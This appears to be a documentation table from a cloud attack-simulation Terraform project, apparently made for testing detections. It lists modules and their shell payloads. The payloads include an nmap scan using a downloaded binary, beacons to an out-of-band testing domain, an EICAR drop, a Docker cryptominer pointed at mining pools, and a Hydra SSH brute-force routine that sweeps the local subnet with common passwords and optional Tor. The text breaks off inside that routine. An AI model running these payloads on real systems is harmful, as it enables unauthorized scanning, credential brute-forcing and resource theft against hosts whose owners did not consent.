/tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>        fi<br/>    done<br/>    EOT<br/><br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;git&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;git&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| target-ssm-connect-nmap-port-scan                                          | ./modules/ssm/connect-nmap-port-scan                           | ssm_connect_enumerate_host                 | context.aws.ssm.target.connect.nmap_port_scan                             | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "target": {<br/>                    "connect": {<br/>                        "nmap_port_scan": {<br/>                            "enabled": false,<br/>                            "nmap_scan_host": "portquiz.net",<br/>                            "nmap_scan_ports": [<br/>                                80,<br/>                                443,<br/>                                23,<br/>                                22,<br/>                                8080,<br/>                                3389,<br/>                                27017,<br/>                                3306,<br/>                                6379,<br/>                                5432,<br/>                                389,<br/>                                636,<br/>                                1389,<br/>                                1636<br/>                            ]<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/connect-nmap-port-scan                           | <pre>locals \{<br/>    nmap\_download = &quot;https://github\.com/andrew\-d/static\-binaries/blob/master/binaries/linux/x86\_64/nmap?raw=true&quot;<br/>    nmap\_path = &quot;/tmp/nmap&quot;<br/>    nmap\_ports = join\(&quot;,&quot;,var\.inputs\[&quot;nmap\_scan\_ports&quot;\]\)<br/>    nmap\_scan\_host = var\.inputs\[&quot;nmap\_scan\_host&quot;\]<br/>    payload = &lt;&lt;\-EOT<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &\#x27;\{ print $1 \}&\#x27;\)<br/>    while true; do<br/>        log &quot;scan target: $\{local\.nmap\_scan\_host\} $\{local\.nmap\_ports\}&quot;<br/>        log &quot;checking for nmap&quot;<br/>        if \! command \-v nmap; then<br/>            log &quot;nmap not found&quot;<br/>            log &quot;downloading: $\{local\.nmap\_download\}&quot;<br/>            if \[ \-f $\{local\.nmap\_path\} \]; then<br/>                curl \-L \-o $\{local\.nmap\_path\} $\{local\.nmap\_download\} &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>                chmod 755 $\{local\.nmap\_path\} &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>            fi<br/>            log &quot;using nmap: $\{local\.nmap\_path\}&quot;<br/>            $\{local\.nmap\_path\} \-sT \-p $\{local\.nmap\_ports\} $\{local\.nmap\_scan\_host\} &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        else<br/>            nmap \-sS \-p $\{local\.nmap\_ports\} $\{local\.nmap\_scan\_host\} &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        fi<br/>        log &\#x27;waiting 30 minutes\.\.\.&\#x27;;<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>        fi<br/>    done<br/>    EOT<br/><br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| target-ssm-connect-oast-host                                               | ./modules/ssm/connect-oast-host                                | ssm_connect_oast_host                      | context.aws.ssm.target.connect.oast                                       | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "target": {<br/>                    "connect": {<br/>                        "oast": {<br/>                            "enabled": false,<br/>                            "retry_delay_secs": 1800<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/connect-oast-host                                | <pre>locals \{<br/>    oast\_domain = &quot;burpcollaborator\.net&quot;<br/>    payload = &lt;&lt;\-EOT<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &\#x27;\{ print $1 \}&\#x27;\)<br/>    while true; do<br/>        OAST\_URL=&quot;https://$\(cat /dev/urandom \| tr \-dc &\#x27;\[:lower:\]&\#x27; \| fold \-w $$\{1:\-16\} \| head \-n 1\)\.$\{local\.oast\_domain\}&quot;<br/>        log &quot;http request: $OAST\_URL&quot;<br/>        curl \-s &quot;$OAST\_URL&quot; &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        log &\#x27;waiting $\{var\.inputs\[&quot;retry\_delay\_secs&quot;\]\} seconds\.\.\.&\#x27;;<br/>        sleep $\{var\.inputs\[&quot;retry\_delay\_secs&quot;\]\}<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>        fi<br/>    done<br/>    EOT<br/><br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       |
| target-ssm-drop-malware-eicar                                              | ./modules/ssm/drop-malware-eicar                               | ssm_deploy_malware_eicar                   | context.aws.ssm.target.drop.malware.eicar                                 | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "target": {<br/>                    "drop": {<br/>                        "malware": {<br/>                            "eicar": {<br/>                                "eicar_path": "/tmp/eicar",<br/>                                "enabled": false<br/>                            }<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/drop-malware-eicar                               | <pre>locals \{<br/>    eicar\_string\_base64 = &quot;WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo=&quot;<br/>    eicar\_path = var\.inputs\[&quot;eicar\_path&quot;\]<br/>    payload = &lt;&lt;\-EOT<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &\#x27;\{ print $1 \}&\#x27;\)<br/>    while true; do<br/>        log &quot;starting script&quot;<br/>        log &quot;creating eicar file: $\{local\.eicar\_path\}\-$\(hostname\)&quot;<br/>        rm \-rf $\{local\.eicar\_path\}\*<br/>        echo \-n &\#x27;$\{base64decode\(local\.eicar\_string\_base64\)\}&\#x27; &gt; $\{local\.eicar\_path\}\-$\(hostname\)<br/>        log &quot;$\(ls \-l $\{local\.eicar\_path\}\-$\(hostname\)\)&quot;<br/>        log &\#x27;waiting 30 minutes\.\.\.&\#x27;;<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>        fi<br/>    done<br/>    log &quot;Done\.&quot;<br/>    EOT<br/>    <br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &quot;&quot;<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &quot;&quot;<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| target-ssm-execute-docker-cpu-miner                                        | ./modules/ssm/execute-docker-cpu-miner                         | ssm_exec_docker_cpuminer                   | context.aws.ssm.target.execute.docker_cpu_miner                           | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "target": {<br/>                    "execute": {<br/>                        "docker_cpu_miner": {<br/>                            "enabled": false,<br/>                            "minergate_image": "mkell43/minerd",<br/>                            "minergate_name": "minerd",<br/>                            "minergate_server": "stratum+tcp://eth.pool.minergate.com:45791",<br/>                            "minergate_user": null,<br/>                            "nicehash_image": "a2ncer/nheqminer_cpu:latest",<br/>                            "nicehash_name": "nicehash",<br/>                            "nicehash_server": "equihash.usa.nicehash.com:3357",<br/>                            "nicehash_user": null<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-docker-cpu-miner                         | <pre>locals \{<br/>    \# nicehash\_name = var\.inputs\[&quot;nicehash\_name&quot;\]<br/>    \# nicehash\_image = var\.inputs\[&quot;nicehash\_image&quot;\]<br/>    \# nicehash\_server = var\.inputs\[&quot;nicehash\_server&quot;\]<br/>    \# nicehash\_user = var\.inputs\[&quot;nicehash\_user&quot;\]<br/>    minergate\_name = var\.inputs\[&quot;minergate\_name&quot;\]<br/>    minergate\_image = var\.inputs\[&quot;minergate\_image&quot;\]<br/>    minergate\_server = var\.inputs\[&quot;minergate\_server&quot;\]<br/>    minergate\_user=var\.inputs\[&quot;minergate\_user&quot;\]<br/><br/>    payload = &lt;&lt;\-EOT<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &\#x27;\{ print $1 \}&\#x27;\)<br/>    while true; do<br/>        log &quot;starting script&quot;<br/>        if \[\[ \`sudo docker ps \| grep $\{local\.minergate\_name\}\` \]\]; then docker stop $\{local\.minergate\_name\}; fi<br/>        sudo docker run \-\-rm \-d \-\-network=host \-\-name $\{local\.minergate\_name\} $\{local\.minergate\_image\} \-a cryptonight \-o $\{local\.minergate\_server\} \-u $\{ local\.minergate\_user \} \-p x<br/>        sudo docker ps \-a &gt;&gt; $LOGFILE 2&gt;&amp;1<br/>        log &\#x27;waiting 30 minutes\.\.\.&\#x27;;<br/>        sleep 1800<br/>        if \! check\_payload\_update /tmp/payload\_$SCRIPTNAME $START\_HASH; then<br/>            log &quot;payload update detected \- exiting loop and forcing payload download&quot;<br/>            rm \-f /tmp/payload\_$SCRIPTNAME<br/>            break<br/>        else<br/>            log &quot;restarting loop\.\.\.&quot;<br/>        fi<br/>    done<br/>    log &quot;Done\.&quot;<br/>    EOT<br/>    <br/>    base64\_payload = templatefile\(&quot;$\{path\.module\}/\.\./\.\./delayed\_start\.sh&quot;, \{ config = \{<br/>        script\_name = var\.inputs\[&quot;tag&quot;\]<br/>        log\_rotation\_count = 2<br/>        apt\_pre\_tasks = &lt;&lt;\-EOT<br/>        log &quot;Checking for docker\.\.\.&quot;<br/>        while \! command \-v docker &gt; /dev/null \|\| \! docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $\(command \-v  docker\)&quot;<br/>        EOT<br/>        apt\_packages = &quot;&quot;<br/>        apt\_post\_tasks = &quot;&quot;<br/>        yum\_pre\_tasks =  &lt;&lt;\-EOT<br/>        log &quot;Checking for docker\.\.\.&quot;<br/>        while \! command \-v docker &gt; /dev/null \|\| \! docker ps &gt; /dev/null; do<br/>            log &quot;docker not found or not ready \- waiting&quot;<br/>            sleep 120<br/>        done<br/>        log &quot;docker path: $\(command \-v  docker\)&quot;<br/>        EOT<br/>        yum\_packages = &quot;&quot;<br/>        yum\_post\_tasks = &quot;&quot;<br/>        script\_delay\_secs = 30<br/>        next\_stage\_payload = local\.payload<br/>    \}\}\)<br/><br/>    outputs = \{<br/>        base64\_payload = base64gzip\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload = base64encode\(local\.base64\_payload\)<br/>        base64\_uncompressed\_payload\_additional = \[\]<br/>    \}<br/>\}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    |
| target-ssm-execute-docker-hydra                                            | ./modules/ssm/execute-docker-hydra                             | ssm_exec_docker_hydra_target               | context.aws.ssm.target.execute.docker_hydra                               | <pre>{<br/>    "context": {<br/>        "aws": {<br/>            "ssm": {<br/>                "target": {<br/>                    "execute": {<br/>                        "docker_hydra": {<br/>                            "attack_delay": 50400,<br/>                            "custom_password_list": [],<br/>                            "custom_user_list": [],<br/>                            "enabled": false,<br/>                            "password_list": "/opt/passwords/darkweb2017-top10.txt",<br/>                            "scan_local_network": true,<br/>                            "targets": [],<br/>                            "use_tor": false,<br/>                            "user_list": "/opt/usernames/top-usernames-shortlist.txt"<br/>                        }<br/>                    }<br/>                }<br/>            }<br/>        }<br/>    }<br/>}</pre>                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  | ../lacework-deploy/terraform/modules/deployment/common/payloads/linux/modules/execute-docker-hydra                             | <pre>locals \{<br/>    attack\_dir = &quot;/hydra&quot;<br/>    targets = flatten\(\[ for target in var\.inputs\[&quot;targets&quot;\]: can\(split\(&quot;/&quot;, target\)\[1\]\) ? <br/>        \[ for host\_number in range\(pow\(2, 32 \- split\(&quot;/&quot;, target\)\[1\]\)\) : cidrhost\(target, host\_number\) \]<br/>        :<br/>        \[ target \]<br/>    \]\)<br/>    base64\_command\_payload = var\.inputs\[&quot;payload&quot;\]<br/>    payload = &lt;&lt;\-EOT<br/>    \# Function to convert IP address to decimal<br/>    ip\_to\_dec\(\) \{<br/>        local IFS=\.<br/>        read ip1 ip2 ip3 ip4 &lt;&lt;&lt; &quot;$1&quot;<br/>        echo &quot;$\(\(ip1 \* 16777216 \+ ip2 \* 65536 \+ ip3 \* 256 \+ ip4\)\)&quot;<br/>    \}<br/><br/>    \# Function to convert decimal to IP address<br/>    dec\_to\_ip\(\) \{<br/>        local ip dec=$1<br/>        for e in \{3\.\.0\}; do<br/>            \(\(octet = dec / \(256 \*\* e\) \)\)<br/>            \(\(dec \-= octet \* 256 \*\* e\)\)<br/>            ip\+=&quot;$$\{octet\}\.&quot;<br/>        done<br/>        echo &quot;$$\{ip%?\}&quot;<br/>    \}<br/><br/>    \# Main function to generate IP list from CIDR<br/>    generate\_ips\(\) \{<br/>        local cidr=&quot;$1&quot;<br/>        local ip=&quot;$$\{cidr%/\*\}&quot;<br/>        local prefix=&quot;$$\{cidr\#\*/\}&quot;<br/>        local netmask=$\(\(0xffffffff ^ \(\(1 &lt;&lt; \(32 \- prefix\)\) \- 1\)\)\)<br/><br/>        local start=$\(ip\_to\_dec &quot;$ip&quot;\)<br/>        local start=$\(\(start &amp; netmask\)\)<br/>        local end=$\(\(start \| \(\(1 &lt;&lt; \(32 \- prefix\)\) \- 1\)\)\)<br/><br/>        for \(\(ip= start; ip &lt;= end; ip\+\+\)\); do<br/>            dec\_to\_ip &quot;$ip&quot;<br/>        done<br/>    \}<br/><br/>    log &quot;cleaning app directory&quot;<br/>    rm \-rf $\{local\.attack\_dir\}<br/>    mkdir \-p $\{local\.attack\_dir\}<br/>    cd $\{local\.attack\_dir\}<br/>    START\_HASH=$\(sha256sum \-\-text /tmp/payload\_$SCRIPTNAME \| awk &\#x27;\{ print $1 \}&\#x27;\)<br/>    while true; do<br/>        log &quot;starting script\.\.\.&quot;<br/>        LOCAL\_NET=$\(ip \-o \-f inet addr show \| awk &\#x27;/scope global/ \{print $4\}&\#x27; \| head \-1\)<br/>        log &quot;LOCAL\_NET: $LOCAL\_NET&quot;<br/>        log &quot;Targets: $\{join\(&quot;,&quot;, local\.targets\)\}&quot;<br/>        echo &quot;$\{ length\(local\.targets\) &gt; 0 ? join\(&quot;\\n&quot;, local\.targets\) : &quot;$\(generate\_ips $LOCAL\_NET\)&quot; \}&quot; &gt; /tmp/hydra\-targets\.txt<br/>        cat &gt; /tmp/hydra\-users\.txt &lt;&lt;&\#x27;EOF&\#x27;<br/>    $\{try\(length\(var\.inputs\[&quot;ssh\_user&quot;\]\.username\),&quot;false&quot;\) \!= &quot;false&quot; ? var\.inputs\[&quot;ssh\_user&quot;\]\.username : &quot;root&quot; \}<br/>    EOF<br/>        cat &gt; /tmp/hydra\-passwords\.txt &lt;&lt;&\#x27;EOF&\#x27;<br/>    123456<br/>    123456789<br/>    111111<br/>    password<br/>    qwerty<br/>    abc123<br/>    12345678<br/>    password1<br/>    1234567<br/>    123123<br/>    $\{try\(length\(var\.inputs\[&quot;ssh\_user&quot;\]\.password\),&quot;false&quot;\) \!= &quot;false&quot; ? var\.inputs\[&quot;ssh\_user&quot;\]\.password : &quot;&quot; \}<br/>    EOF<br/>        if sudo docker ps \-a \| grep $\{var\.inputs\[&quot;container\_name&quot;\]\}; then <br/>        sudo docker stop $\{var\.inputs\[&quot;container\_name&quot;\]\}<br/>        sudo docker rm $\{var\.inputs\[&quot;container\_name&quot;\]\}<br/>        fi<br/>        truncate \-s 0 /tmp/hydra\-found\.txt<br/>        $\{ var\.inputs\[&quot;use\_tor&quot;\] == true ? &lt;&lt;\-EOF<br/>        log &quot;Using tor network\.\.\.&quot;<br/>        if \! docker ps \| grep torproxy &gt; /dev/null; then<br/>        sudo docker run \-d \-\-rm \-\-name torproxy \-p 9050:9050 dperson/torproxy<br/>        fi<br/>        TORPROXY=$\(docker inspect \-f &\#x27;\{\{range \.NetworkSettings\.Networks\}\}\{\{\.IPAddress\}\}\{\{end\}\}&\#x27; torproxy\)<br/>        log &quot;Running: proxychains hydra \-V \-L $\{var\.inputs\[&quot;user\_list&quot;\]\} \-P $\{var\.inputs\[&quot;password\_list&quot;\]\} \-M /tmp/hydra\-targets\.txt \-dvV \-t 4 \-u \-w 10 ssh&quot;<br/>        sudo /bin/bash \-c &quot;docker run \-v /tmp:/tmp \-e TORPROXY=$TORPROXY \-\-name $\{var\.inputs\[&quot;container\_name&quot;\]\} $\{var\.inputs\[&quot;image&quot;\]\} hydra \-V \-L $\{var\.inputs\[&quot;user\_list&quot;\]\} \-P $\{var\.inputs\[&quot;password\_list&quot;\]\} \-o /tmp/hydra\-found\.txt \-M /tmp/hydra\-targets\.txt \-dvV \-t 4 \-u \-w 10 ssh \|\| true&quot;<br/>        sudo /bin/bash \-c &quot;docker logs $\{var\.inputs\[&quot;container\_name&quot;\]\} &gt;&gt; $LOGFILE 2&gt;&amp;1&quot;<br/>        sudo /bin/bash \-c &quot;docker rm $\{var\.inputs\[&quot;container\_name&quot;\]\}&quot;<br/>        log &quot;Running: proxychains hydra \-V \-L /tmp/hydra\-users\.txt \-P /tmp/hydra\-passwords\.txt \-M /tmp/hydra\-targets\.txt \-dvV \-t 4 \-u \-w 10 ssh&quot;<br/>        sudo /bin/bash \-c &quot;docker run \-v /tmp:/tmp \-e TORPROXY=$TORPROXY \-\-name $\{var\.inputs\[&quot;container\_name&quot;\]\} $\{var\.inputs\[&quot;image&quot;\]\} hydra 